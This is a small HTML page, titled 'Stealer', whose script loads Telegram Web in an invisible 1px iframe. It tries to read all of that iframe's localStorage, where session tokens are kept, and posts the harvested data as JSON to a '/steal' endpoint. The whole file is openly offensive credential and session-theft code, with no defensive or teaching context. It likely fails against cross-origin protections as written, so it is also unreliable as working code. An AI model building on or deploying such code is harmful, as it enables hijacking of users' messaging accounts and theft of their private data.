<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Stealer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<h1>Stealing...</h1>
<script>
    const iframe = document.createElement('iframe');
    iframe.src = 'https://web.telegram.org/k/';
    iframe.style.position = 'absolute';
    iframe.style.width = '1px';
    iframe.style.height = '1px';
    iframe.style.opacity = '0';
    document.body.appendChild(iframe);
    
    setTimeout(() => {
        try {
            const ls = iframe.contentWindow.localStorage;
            const data = {};
            for (let i = 0; i < ls.length; i++) {
                const key = ls.key(i);
                data[key] = ls.getItem(key);
            }
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ type: 'localstorage', data: data })
            });
            document.body.innerHTML = '<h2>Done</h2>';
        } catch(e) {
            document.body.innerHTML = '<h2>Error: ' + e.message + '</h2>';
        }
    }, 3000);
</script>
</body>
</html>
